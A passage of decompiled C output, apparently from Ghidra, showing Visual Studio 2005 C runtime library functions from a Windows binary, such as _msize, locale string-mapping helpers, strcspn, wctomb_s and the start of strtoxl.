    if (bVar4 != ((byte *)_Str2)[1]) break;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((uint)uVar2 >> 0x10);
    bVar5 = bVar4 < ((byte *)_Str2)[2];
    if (bVar4 != ((byte *)_Str2)[2]) break;
    bVar3 = (byte)((uint)uVar2 >> 0x18);
    if (bVar4 == 0) {
      return 0;
    }
    bVar5 = bVar3 < ((byte *)_Str2)[3];
    if (bVar3 != ((byte *)_Str2)[3]) break;
    _Str2 = (char *)((byte *)_Str2 + 4);
    _Str1 = (char *)((int)_Str1 + 4);
    if (bVar3 == 0) {
      return 0;
    }
  }
LAB_00415844:
  return (uint)bVar5 * -2 + 1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __msize
// 
// Library: Visual Studio 2005 Release

size_t __cdecl __msize(void *_Memory)

{
  int *piVar1;
  size_t sVar2;
  int iVar3;
  void *this;
  size_t local_20;
  
  if (_Memory == (void *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    sVar2 = 0xffffffff;
  }
  else {
    if (DAT_004257fc == 3) {
      this = (void *)0x4;
      __lock(4);
      iVar3 = thunk_FUN_0040e4f0(this,(int)_Memory);
      if (iVar3 != 0) {
        local_20 = *(int *)((int)_Memory + -4) - 9;
      }
      FUN_00415922();
      if (iVar3 != 0) {
        return local_20;
      }
    }
    sVar2 = HeapSize(DAT_00423eb4,0,_Memory);
  }
  return sVar2;
}



void FUN_00415922(void)

{
  FUN_0040e37b(4);
  return;
}



// Library Function - Single Match
//  long __stdcall __CxxUnhandledExceptionFilter(struct _EXCEPTION_POINTERS *)
// 
// Library: Visual Studio 2005 Release

long __CxxUnhandledExceptionFilter(_EXCEPTION_POINTERS *param_1)

{
  PEXCEPTION_RECORD pEVar1;
  ULONG_PTR UVar2;
  code *pcVar3;
  int iVar4;
  long lVar5;
  uint unaff_ESI;
  
  pEVar1 = param_1->ExceptionRecord;
  if (((pEVar1->ExceptionCode == 0xe06d7363) && (pEVar1->NumberParameters == 3)) &&
     ((UVar2 = pEVar1->ExceptionInformation[0], UVar2 == 0x19930520 ||
      (((UVar2 == 0x19930521 || (UVar2 == 0x19930522)) || (UVar2 == 0x1994000)))))) {
    terminate();
  }
  if (((DAT_004244cc != '\0') &&
      (pcVar3 = (code *)__decode_pointer(DAT_004244c8), pcVar3 != (code *)0x0)) &&
     (iVar4 = _ValidateRead(pcVar3,unaff_ESI), iVar4 != 0)) {
    lVar5 = (*pcVar3)(param_1);
    return lVar5;
  }
  return 0;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  int __cdecl __crtLCMapStringA_stat(struct localeinfo_struct *,unsigned long,unsigned long,char
// const *,int,char *,int,int,int)
// 
// Library: Visual Studio 2005 Release

int __cdecl
__crtLCMapStringA_stat
          (localeinfo_struct *param_1,ulong param_2,ulong param_3,char *param_4,int param_5,
          char *param_6,int param_7,int param_8,int param_9)

{
  uint uVar1;
  bool bVar2;
  int iVar3;
  DWORD DVar4;
  char *pcVar5;
  uint cchWideChar;
  undefined4 *puVar6;
  UINT UVar7;
  int *in_ECX;
  char *pcVar8;
  LPSTR lpMultiByteStr;
  void *local_14;
  undefined4 *local_10;
  uint local_c;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  if (DAT_004244d0 == 0) {
    iVar3 = LCMapStringW(0,0x100,(LPCWSTR)&DAT_0041cae4,1,(LPWSTR)0x0,0);
    if (iVar3 == 0) {
      DVar4 = GetLastError();
      if (DVar4 == 0x78) {
        DAT_004244d0 = 2;
      }
    }
    else {
      DAT_004244d0 = 1;
    }
  }
  pcVar5 = (char *)param_3;
  pcVar8 = param_4;
  if (0 < (int)param_4) {
    do {
      pcVar8 = pcVar8 + -1;
      if (*pcVar5 == '\0') goto LAB_00415a4b;
      pcVar5 = pcVar5 + 1;
    } while (pcVar8 != (char *)0x0);
    pcVar8 = (char *)0xffffffff;
LAB_00415a4b:
    pcVar5 = param_4 + -(int)pcVar8;
    bVar2 = (int)(pcVar5 + -1) < (int)param_4;
    param_4 = pcVar5 + -1;
    if (bVar2) {
      param_4 = pcVar5;
    }
  }
  if ((DAT_004244d0 == 2) || (DAT_004244d0 == 0)) {
    local_10 = (undefined4 *)0x0;
    local_14 = (void *)0x0;
    if (param_1 == (localeinfo_struct *)0x0) {
      param_1 = *(localeinfo_struct **)(*in_ECX + 0x14);
    }
    if (param_7 == 0) {
      param_7 = *(int *)(*in_ECX + 4);
    }
    UVar7 = ___ansicp((LCID)param_1);
    if (UVar7 == 0xffffffff) goto LAB_00415d6c;
    if (UVar7 == param_7) {
      LCMapStringA((LCID)param_1,param_2,(LPCSTR)param_3,(int)param_4,(LPSTR)param_5,(int)param_6);
    }
    else {
      local_10 = (undefined4 *)
                 ___convertcp(param_7,UVar7,(char *)param_3,(uint *)&param_4,(LPSTR)0x0,0);
      if (local_10 == (undefined4 *)0x0) goto LAB_00415d6c;
      local_c = LCMapStringA((LCID)param_1,param_2,(LPCSTR)local_10,(int)param_4,(LPSTR)0x0,0);
      if (local_c != 0) {
        if (((int)local_c < 1) || (0xffffffe0 < local_c)) {
          puVar6 = (undefined4 *)0x0;
        }
        else if (local_c + 8 < 0x401) {
          if (&stack0x00000000 == (undefined *)0x24) goto LAB_00415d49;
          puVar6 = (undefined4 *)&stack0xffffffe4;
        }
        else {
          puVar6 = (undefined4 *)_malloc(local_c + 8);
          if (puVar6 != (undefined4 *)0x0) {
            *puVar6 = 0xdddd;
            puVar6 = puVar6 + 2;
          }
        }
        if (puVar6 != (undefined4 *)0x0) {
          _memset(puVar6,0,local_c);
          local_c = LCMapStringA((LCID)param_1,param_2,(LPCSTR)local_10,(int)param_4,(LPSTR)puVar6,
                                 local_c);
          if (local_c != 0) {
            local_14 = (void *)___convertcp(UVar7,param_7,(char *)puVar6,&local_c,(LPSTR)param_5,
                                            (int)param_6);
          }
          __freea(puVar6);
        }
      }
    }
LAB_00415d49:
    if (local_10 != (undefined4 *)0x0) {
      _free(local_10);
    }
    if ((local_14 != (void *)0x0) && ((void *)param_5 != local_14)) {
      _free(local_14);
    }
    goto LAB_00415d6c;
  }
  if (DAT_004244d0 != 1) goto LAB_00415d6c;
  local_c = 0;
  if (param_7 == 0) {
    param_7 = *(int *)(*in_ECX + 4);
  }
  cchWideChar = MultiByteToWideChar(param_7,(uint)(param_8 != 0) * 8 + 1,(LPCSTR)param_3,
                                    (int)param_4,(LPWSTR)0x0,0);
  if (cchWideChar == 0) goto LAB_00415d6c;
  if (((int)cchWideChar < 1) || (0xffffffe0 / cchWideChar < 2)) {
    local_10 = (undefined4 *)0x0;
  }
  else {
    uVar1 = cchWideChar * 2 + 8;
    if (uVar1 < 0x401) {
      puVar6 = (undefined4 *)&stack0xffffffdc;
      local_10 = (undefined4 *)&stack0xffffffdc;
      if (&stack0x00000000 != (undefined *)0x24) {
LAB_00415af3:
        local_10 = puVar6 + 2;
      }
    }
    else {
      puVar6 = (undefined4 *)_malloc(uVar1);
      local_10 = puVar6;
      if (puVar6 != (undefined4 *)0x0) {
        *puVar6 = 0xdddd;
        goto LAB_00415af3;
      }
    }
  }
  if (local_10 == (undefined4 *)0x0) goto LAB_00415d6c;
  iVar3 = MultiByteToWideChar(param_7,1,(LPCSTR)param_3,(int)param_4,(LPWSTR)local_10,cchWideChar);
  if ((iVar3 != 0) &&
     (local_c = LCMapStringW((LCID)param_1,param_2,(LPCWSTR)local_10,cchWideChar,(LPWSTR)0x0,0),
     local_c != 0)) {
    if ((param_2 & 0x400) == 0) {
      if (((int)local_c < 1) || (0xffffffe0 / local_c < 2)) {
        puVar6 = (undefined4 *)0x0;
      }
      else {
        uVar1 = local_c * 2 + 8;
        if (uVar1 < 0x401) {
          if (&stack0x00000000 == (undefined *)0x24) goto LAB_00415c02;
          puVar6 = (undefined4 *)&stack0xffffffe4;
        }
        else {
          puVar6 = (undefined4 *)_malloc(uVar1);
          if (puVar6 != (undefined4 *)0x0) {
            *puVar6 = 0xdddd;
            puVar6 = puVar6 + 2;
          }
        }
      }
      if (puVar6 != (undefined4 *)0x0) {
        iVar3 = LCMapStringW((LCID)param_1,param_2,(LPCWSTR)local_10,cchWideChar,(LPWSTR)puVar6,
                             local_c);
        if (iVar3 != 0) {
          lpMultiByteStr = (LPSTR)param_5;
          pcVar5 = param_6;
          if (param_6 == (char *)0x0) {
            lpMultiByteStr = (LPSTR)0x0;
            pcVar5 = (char *)0x0;
          }
          local_c = WideCharToMultiByte(param_7,0,(LPCWSTR)puVar6,local_c,lpMultiByteStr,(int)pcVar5
                                        ,(LPCSTR)0x0,(LPBOOL)0x0);
        }
        __freea(puVar6);
      }
    }
    else if ((param_6 != (char *)0x0) && ((int)local_c <= (int)param_6)) {
      LCMapStringW((LCID)param_1,param_2,(LPCWSTR)local_10,cchWideChar,(LPWSTR)param_5,(int)param_6)
      ;
    }
  }
LAB_00415c02:
  __freea(local_10);
LAB_00415d6c:
  iVar3 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar3;
}



// Library Function - Single Match
//  ___crtLCMapStringA
// 
// Library: Visual Studio 2005 Release

int __cdecl
___crtLCMapStringA(_locale_t _Plocinfo,LPCWSTR _LocaleName,DWORD _DwMapFlag,LPCSTR _LpSrcStr,
                  int _CchSrc,LPSTR _LpDestStr,int _CchDest,int _Code_page,BOOL _BError)

{
  int iVar1;
  int in_stack_ffffffec;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&stack0xffffffec,_Plocinfo);
  iVar1 = __crtLCMapStringA_stat
                    ((localeinfo_struct *)_LocaleName,_DwMapFlag,(ulong)_LpSrcStr,(char *)_CchSrc,
                     (int)_LpDestStr,(char *)_CchDest,_Code_page,_BError,in_stack_ffffffec);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  int __cdecl __crtGetStringTypeA_stat(struct localeinfo_struct *,unsigned long,char const
// *,int,unsigned short *,int,int,int)
// 
// Library: Visual Studio 2005 Release

int __cdecl
__crtGetStringTypeA_stat
          (localeinfo_struct *param_1,ulong param_2,char *param_3,int param_4,ushort *param_5,
          int param_6,int param_7,int param_8)

{
  uint _Size;
  BOOL BVar1;
  DWORD DVar2;
  uint cchWideChar;
  undefined4 *puVar3;
  int iVar4;
  ushort *puVar5;
  int *in_ECX;
  undefined4 *lpWideCharStr;
  void *_Memory;
  int *local_c;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_c = in_ECX;
  if (DAT_004244d4 == 0) {
    BVar1 = GetStringTypeW(1,(LPCWSTR)&DAT_0041cae4,1,(LPWORD)&local_c);
    if (BVar1 == 0) {
      DVar2 = GetLastError();
      if (DVar2 == 0x78) {
        DAT_004244d4 = 2;
      }
      goto LAB_00415e1a;
    }
    DAT_004244d4 = 1;
  }
  else {
LAB_00415e1a:
    if ((DAT_004244d4 == 2) || (DAT_004244d4 == 0)) {
      _Memory = (void *)0x0;
      if (param_6 == 0) {
        param_6 = *(int *)(*in_ECX + 0x14);
      }
      if (param_5 == (ushort *)0x0) {
        param_5 = *(ushort **)(*in_ECX + 4);
      }
      puVar5 = (ushort *)___ansicp(param_6);
      if ((puVar5 != (ushort *)0xffffffff) &&
         (((puVar5 == param_5 ||
           (_Memory = (void *)___convertcp((UINT)param_5,(UINT)puVar5,(char *)param_2,
                                           (uint *)&param_3,(LPSTR)0x0,0), param_2 = (ulong)_Memory,
           _Memory != (void *)0x0)) &&
          (GetStringTypeA(param_6,(DWORD)param_1,(LPCSTR)param_2,(int)param_3,(LPWORD)param_4),
          _Memory != (void *)0x0)))) {
        _free(_Memory);
      }
      goto LAB_00415f67;
    }
    if (DAT_004244d4 != 1) goto LAB_00415f67;
  }
  local_c = (int *)0x0;
  if (param_5 == (ushort *)0x0) {
    param_5 = *(ushort **)(*in_ECX + 4);
  }
  cchWideChar = MultiByteToWideChar((UINT)param_5,(uint)(param_7 != 0) * 8 + 1,(LPCSTR)param_2,
                                    (int)param_3,(LPWSTR)0x0,0);
  if (cchWideChar == 0) goto LAB_00415f67;
  lpWideCharStr = (undefined4 *)0x0;
  if ((0 < (int)cchWideChar) && (cchWideChar < 0x7ffffff1)) {
    _Size = cchWideChar * 2 + 8;
    if (_Size < 0x401) {
      puVar3 = (undefined4 *)&stack0xffffffe8;
      lpWideCharStr = (undefined4 *)&stack0xffffffe8;
      if (&stack0x00000000 != (undefined *)0x18) {
LAB_00415eaa:
        lpWideCharStr = puVar3 + 2;
      }
    }
    else {
      puVar3 = (undefined4 *)_malloc(_Size);
      lpWideCharStr = puVar3;
      if (puVar3 != (undefined4 *)0x0) {
        *puVar3 = 0xdddd;
        goto LAB_00415eaa;
      }
    }
  }
  if (lpWideCharStr != (undefined4 *)0x0) {
    _memset(lpWideCharStr,0,cchWideChar * 2);
    iVar4 = MultiByteToWideChar((UINT)param_5,1,(LPCSTR)param_2,(int)param_3,(LPWSTR)lpWideCharStr,
                                cchWideChar);
    if (iVar4 != 0) {
      local_c = (int *)GetStringTypeW((DWORD)param_1,(LPCWSTR)lpWideCharStr,iVar4,(LPWORD)param_4);
    }
    __freea(lpWideCharStr);
  }
LAB_00415f67:
  iVar4 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar4;
}



// Library Function - Single Match
//  ___crtGetStringTypeA
// 
// Library: Visual Studio 2005 Release

BOOL __cdecl
___crtGetStringTypeA
          (_locale_t _Plocinfo,DWORD _DWInfoType,LPCSTR _LpSrcStr,int _CchSrc,LPWORD _LpCharType,
          int _Code_page,BOOL _BError)

{
  int iVar1;
  int in_stack_00000020;
  int in_stack_ffffffec;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&stack0xffffffec,_Plocinfo);
  iVar1 = __crtGetStringTypeA_stat
                    ((localeinfo_struct *)_DWInfoType,(ulong)_LpSrcStr,(char *)_CchSrc,
                     (int)_LpCharType,(ushort *)_Code_page,_BError,in_stack_00000020,
                     in_stack_ffffffec);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



// Library Function - Single Match
//  ___free_lc_time
// 
// Library: Visual Studio 2005 Release

void __cdecl ___free_lc_time(void **param_1)

{
  if (param_1 != (void **)0x0) {
    _free(param_1[1]);
    _free(param_1[2]);
    _free(param_1[3]);
    _free(param_1[4]);
    _free(param_1[5]);
    _free(param_1[6]);
    _free(*param_1);
    _free(param_1[8]);
    _free(param_1[9]);
    _free(param_1[10]);
    _free(param_1[0xb]);
    _free(param_1[0xc]);
    _free(param_1[0xd]);
    _free(param_1[7]);
    _free(param_1[0xe]);
    _free(param_1[0xf]);
    _free(param_1[0x10]);
    _free(param_1[0x11]);
    _free(param_1[0x12]);
    _free(param_1[0x13]);
    _free(param_1[0x14]);
    _free(param_1[0x15]);
    _free(param_1[0x16]);
    _free(param_1[0x17]);
    _free(param_1[0x18]);
    _free(param_1[0x19]);
    _free(param_1[0x1a]);
    _free(param_1[0x1b]);
    _free(param_1[0x1c]);
    _free(param_1[0x1d]);
    _free(param_1[0x1e]);
    _free(param_1[0x1f]);
    _free(param_1[0x20]);
    _free(param_1[0x21]);
    _free(param_1[0x22]);
    _free(param_1[0x23]);
    _free(param_1[0x24]);
    _free(param_1[0x25]);
    _free(param_1[0x26]);
    _free(param_1[0x27]);
    _free(param_1[0x28]);
    _free(param_1[0x29]);
    _free(param_1[0x2a]);
  }
  return;
}



// Library Function - Single Match
//  ___free_lconv_num
// 
// Library: Visual Studio 2005 Release

void __cdecl ___free_lconv_num(void **param_1)

{
  if (param_1 != (void **)0x0) {
    if (*param_1 != DAT_00422f38) {
      _free(*param_1);
    }
    if (param_1[1] != DAT_00422f3c) {
      _free(param_1[1]);
    }
    if (param_1[2] != DAT_00422f40) {
      _free(param_1[2]);
    }
  }
  return;
}



// Library Function - Single Match
//  ___free_lconv_mon
// 
// Library: Visual Studio 2005 Release

void __cdecl ___free_lconv_mon(int param_1)

{
  if (param_1 != 0) {
    if (*(void **)(param_1 + 0xc) != DAT_00422f44) {
      _free(*(void **)(param_1 + 0xc));
    }
    if (*(void **)(param_1 + 0x10) != DAT_00422f48) {
      _free(*(void **)(param_1 + 0x10));
    }
    if (*(void **)(param_1 + 0x14) != DAT_00422f4c) {
      _free(*(void **)(param_1 + 0x14));
    }
    if (*(void **)(param_1 + 0x18) != DAT_00422f50) {
      _free(*(void **)(param_1 + 0x18));
    }
    if (*(void **)(param_1 + 0x1c) != DAT_00422f54) {
      _free(*(void **)(param_1 + 0x1c));
    }
    if (*(void **)(param_1 + 0x20) != DAT_00422f58) {
      _free(*(void **)(param_1 + 0x20));
    }
    if (*(void **)(param_1 + 0x24) != DAT_00422f5c) {
      _free(*(void **)(param_1 + 0x24));
    }
  }
  return;
}



// Library Function - Single Match
//  _strcspn
// 
// Library: Visual Studio

size_t __cdecl _strcspn(char *_Str,char *_Control)

{
  byte bVar1;
  byte *pbVar2;
  size_t sVar3;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined4 uStack_20;
  undefined4 uStack_1c;
  undefined4 uStack_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  
  uStack_c = 0;
  uStack_10 = 0;
  uStack_14 = 0;
  uStack_18 = 0;
  uStack_1c = 0;
  uStack_20 = 0;
  uStack_24 = 0;
  uStack_28 = 0;
  while( true ) {
    bVar1 = *_Control;
    if (bVar1 == 0) break;
    _Control = (char *)((byte *)_Control + 1);
    pbVar2 = (byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3));
    *pbVar2 = *pbVar2 | '\x01' << (bVar1 & 7);
  }
  sVar3 = 0xffffffff;
  do {
    sVar3 = sVar3 + 1;
    bVar1 = *_Str;
    if (bVar1 == 0) {
      return sVar3;
    }
    _Str = (char *)((byte *)_Str + 1);
  } while ((*(byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3)) >> (bVar1 & 7) & 1) == 0);
  return sVar3;
}



// Library Function - Single Match
//  _strpbrk
// 
// Library: Visual Studio

char * __cdecl _strpbrk(char *_Str,char *_Control)

{
  byte bVar1;
  byte *pbVar2;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined4 uStack_20;
  undefined4 uStack_1c;
  undefined4 uStack_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  
  uStack_c = 0;
  uStack_10 = 0;
  uStack_14 = 0;
  uStack_18 = 0;
  uStack_1c = 0;
  uStack_20 = 0;
  uStack_24 = 0;
  uStack_28 = 0;
  while( true ) {
    bVar1 = *_Control;
    if (bVar1 == 0) break;
    _Control = (char *)((byte *)_Control + 1);
    pbVar2 = (byte *)((int)&uStack_28 + ((int)(uint)bVar1 >> 3));
    *pbVar2 = *pbVar2 | '\x01' << (bVar1 & 7);
  }
  do {
    pbVar2 = (byte *)_Str;
    bVar1 = *pbVar2;
    if (bVar1 == 0) {
      return (char *)(uint)bVar1;
    }
    _Str = (char *)(pbVar2 + 1);
  } while ((*(byte *)((int)&uStack_28 + ((int)(char *)(uint)bVar1 >> 3)) >> (bVar1 & 7) & 1) == 0);
  return (char *)pbVar2;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  int __cdecl __crtGetStringTypeW_stat(struct localeinfo_struct *,unsigned long,wchar_t const
// *,int,unsigned short *,int,int)
// 
// Library: Visual Studio 2005 Release

int __cdecl
__crtGetStringTypeW_stat
          (localeinfo_struct *param_1,ulong param_2,wchar_t *param_3,int param_4,ushort *param_5,
          int param_6,int param_7)

{
  short *psVar1;
  uint _Size;
  undefined4 *lpSrcStr;
  BOOL BVar2;
  DWORD DVar3;
  uint _Size_00;
  undefined4 *puVar4;
  int iVar5;
  undefined4 *local_c;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  if (param_4 < -1) goto LAB_004164c2;
  if (DAT_004244dc == 0) {
    BVar2 = GetStringTypeW(1,(LPCWSTR)&DAT_0041cae4,1,(LPWORD)&local_c);
    if (BVar2 == 0) {
      DVar3 = GetLastError();
      if (DVar3 == 0x78) {
        DAT_004244dc = 2;
      }
      goto LAB_00416317;
    }
    DAT_004244dc = 1;
  }
  else {
LAB_00416317:
    if (DAT_004244dc != 1) {
      if ((DAT_004244dc != 2) && (DAT_004244dc != 0)) goto LAB_004164c2;
      if (param_7 == 0) {
        param_7 = (int)param_1->locinfo->lc_category[0].wlocale;
      }
      if (param_6 == 0) {
        param_6 = param_1->locinfo->lc_codepage;
      }
      iVar5 = ___ansicp(param_7);
      if ((param_6 != iVar5) && (iVar5 != -1)) {
        param_6 = iVar5;
      }
      _Size_00 = WideCharToMultiByte(param_6,0,param_3,param_4,(LPSTR)0x0,0,(LPCSTR)0x0,(LPBOOL)0x0)
      ;
      if (_Size_00 == 0) goto LAB_004164c2;
      if (((int)_Size_00 < 1) || (0xffffffe0 < _Size_00)) {
        local_c = (undefined4 *)0x0;
      }
      else if (_Size_00 + 8 < 0x401) {
        puVar4 = (undefined4 *)&stack0xffffffe0;
        local_c = (undefined4 *)&stack0xffffffe0;
        if (&stack0x00000000 != (undefined *)0x20) {
LAB_004163c8:
          local_c = puVar4 + 2;
        }
      }
      else {
        puVar4 = (undefined4 *)_malloc(_Size_00 + 8);
        local_c = puVar4;
        if (puVar4 != (undefined4 *)0x0) {
          *puVar4 = 0xdddd;
          goto LAB_004163c8;
        }
      }
      if (local_c == (undefined4 *)0x0) goto LAB_004164c2;
      _memset(local_c,0,_Size_00);
      iVar5 = WideCharToMultiByte(param_6,0,param_3,param_4,(LPSTR)local_c,_Size_00,(LPCSTR)0x0,
                                  (LPBOOL)0x0);
      if (iVar5 != 0) {
        if (((int)(_Size_00 + 1) < 1) || (0x7ffffff0 < _Size_00 + 1)) {
          puVar4 = (undefined4 *)0x0;
        }
        else {
          _Size = _Size_00 * 2 + 10;
          if (_Size < 0x401) {
            if (&stack0x00000000 == (undefined *)0x20) goto LAB_004164b6;
            puVar4 = (undefined4 *)&stack0xffffffe8;
          }
          else {
            puVar4 = (undefined4 *)_malloc(_Size);
            if (puVar4 != (undefined4 *)0x0) {
              *puVar4 = 0xdddd;
              puVar4 = puVar4 + 2;
            }
          }
        }
        lpSrcStr = local_c;
        if (puVar4 != (undefined4 *)0x0) {
          if (param_7 == 0) {
            param_7 = (int)param_1->locinfo->lc_category[0].wlocale;
          }
          psVar1 = (short *)(param_4 * 2 + (int)puVar4);
          *psVar1 = -1;
          psVar1[-1] = -1;
          GetStringTypeA(param_7,param_2,(LPCSTR)lpSrcStr,_Size_00,(LPWORD)puVar4);
          if ((psVar1[-1] != -1) && (*psVar1 == -1)) {
            _memmove(param_5,puVar4,param_4 * 2);
          }
          __freea(puVar4);
        }
      }
LAB_004164b6:
      __freea(local_c);
      goto LAB_004164c2;
    }
  }
  GetStringTypeW(param_2,param_3,param_4,param_5);
LAB_004164c2:
  iVar5 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar5;
}



// Library Function - Single Match
//  ___crtGetStringTypeW
// 
// Library: Visual Studio 2005 Release

void __cdecl
___crtGetStringTypeW
          (localeinfo_struct *param_1,ulong param_2,wchar_t *param_3,int param_4,ushort *param_5,
          int param_6,int param_7)

{
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,param_1);
  __crtGetStringTypeW_stat(&local_14,param_2,param_3,param_4,param_5,param_6,param_7);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return;
}



// Library Function - Single Match
//  __wctomb_s_l
// 
// Library: Visual Studio 2005 Release

errno_t __cdecl
__wctomb_s_l(int *_SizeConverted,char *_MbCh,size_t _SizeInBytes,wchar_t _WCh,_locale_t _Locale)

{
  char *lpMultiByteStr;
  size_t _Size;
  int iVar1;
  int *piVar2;
  DWORD DVar3;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _Size = _SizeInBytes;
  lpMultiByteStr = _MbCh;
  if ((_MbCh == (char *)0x0) && (_SizeInBytes != 0)) {
    if (_SizeConverted != (int *)0x0) {
      *_SizeConverted = 0;
    }
LAB_00416534:
    iVar1 = 0;
  }
  else {
    if (_SizeConverted != (int *)0x0) {
      *_SizeConverted = -1;
    }
    if (0x7fffffff < _SizeInBytes) {
      piVar2 = __errno();
      *piVar2 = 0x16;
      __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      return 0x16;
    }
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
    if (*(int *)(local_14[0] + 0x14) == 0) {
      if ((ushort)_WCh < 0x100) {
        if (lpMultiByteStr != (char *)0x0) {
          if (_Size == 0) goto LAB_004165c4;
          *lpMultiByteStr = (char)_WCh;
        }
        if (_SizeConverted != (int *)0x0) {
          *_SizeConverted = 1;
        }
LAB_004165fb:
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        goto LAB_00416534;
      }
      if ((lpMultiByteStr != (char *)0x0) && (_Size != 0)) {
        _memset(lpMultiByteStr,0,_Size);
      }
    }
    else {
      _MbCh = (char *)0x0;
      iVar1 = WideCharToMultiByte(*(UINT *)(local_14[0] + 4),0,&_WCh,1,lpMultiByteStr,_Size,
                                  (LPCSTR)0x0,(LPBOOL)&_MbCh);
      if (iVar1 == 0) {
        DVar3 = GetLastError();
        if (DVar3 == 0x7a) {
          if ((lpMultiByteStr != (char *)0x0) && (_Size != 0)) {
            _memset(lpMultiByteStr,0,_Size);
          }
LAB_004165c4:
          piVar2 = __errno();
          *piVar2 = 0x22;
          __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
          if (local_8 == '\0') {
            return 0x22;
          }
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
          return 0x22;
        }
      }
      else if (_MbCh == (char *)0x0) {
        if (_SizeConverted != (int *)0x0) {
          *_SizeConverted = iVar1;
        }
        goto LAB_004165fb;
      }
    }
    piVar2 = __errno();
    *piVar2 = 0x2a;
    piVar2 = __errno();
    iVar1 = *piVar2;
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
  }
  return iVar1;
}



// Library Function - Single Match
//  _wctomb_s
// 
// Library: Visual Studio 2005 Release

errno_t __cdecl _wctomb_s(int *_SizeConverted,char *_MbCh,rsize_t _SizeInBytes,wchar_t _WCh)

{
  errno_t eVar1;
  
  eVar1 = __wctomb_s_l(_SizeConverted,_MbCh,_SizeInBytes,_WCh,(_locale_t)0x0);
  return eVar1;
}



// Library Function - Single Match
//  unsigned long __cdecl strtoxl(struct localeinfo_struct *,char const *,char const * *,int,int)
// 
// Library: Visual Studio 2005 Release

ulong __cdecl
strtoxl(localeinfo_struct *param_1,char *param_2,char **param_3,int param_4,int param_5)

{
  ushort uVar1;
  byte *pbVar2;
  int *piVar3;
  uint uVar4;
  pthreadlocinfo ptVar5;
  uint uVar6;
  int iVar7;
  byte bVar8;
  byte *pbVar9;
  localeinfo_struct local_18;
  int local_10;
  char local_c;
  ulong local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_18,param_1);
  if (param_3 != (char **)0x0) {
    *param_3 = param_2;
  }
  if ((param_2 == (char *)0x0) || ((param_4 != 0 && ((param_4 < 2 || (0x24 < param_4)))))) {
    piVar3 = __errno();
    *piVar3 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
    return 0;
  }
  bVar8 = *param_2;
  local_8 = 0;
  ptVar5 = local_18.locinfo;
  pbVar2 = (byte *)param_2;
  while( true ) {
    pbVar9 = pbVar2 + 1;
    if ((int)ptVar5->locale_name[3] < 2) {
      uVar4 = (byte)ptVar5[1].lc_category[0].locale[(uint)bVar8 * 2] & 8;
    }
    else {
      uVar4 = __isctype_l((uint)bVar8,8,&local_18);
      ptVar5 = local_18.locinfo;
    }
    if (uVar4 == 0) break;
    bVar8 = *pbVar9;
    pbVar2 = pbVar9;
  }
  if (bVar8 == 0x2d) {
    param_5 = param_5 | 2;
LAB_00416743:
    bVar8 = *pbVar9;
    pbVar9 = pbVar2 + 2;
  }
  else if (bVar8 == 0x2b) goto LAB_00416743;
  if (((param_4 < 0) || (param_4 == 1)) || (0x24 < param_4)) {
    if (param_3 != (char **)0x0) {
      *param_3 = param_2;
    }
    if (local_c != '\0') {
      *(uint *)(local_10 + 0x70) = *(uint *)(local_10 + 0x70) & 0xfffffffd;
    }
    return 0;
  }
  if (param_4 == 0) {
    if (bVar8 != 0x30) {
      param_4 = 10;
      goto LAB_004167a9;
    }
    if ((*pbVar9 != 0x78) && (*pbVar9 != 0x58)) {
      param_4 = 8;
      goto LAB_004167a9;
    }
    param_4 = 0x10;
  }
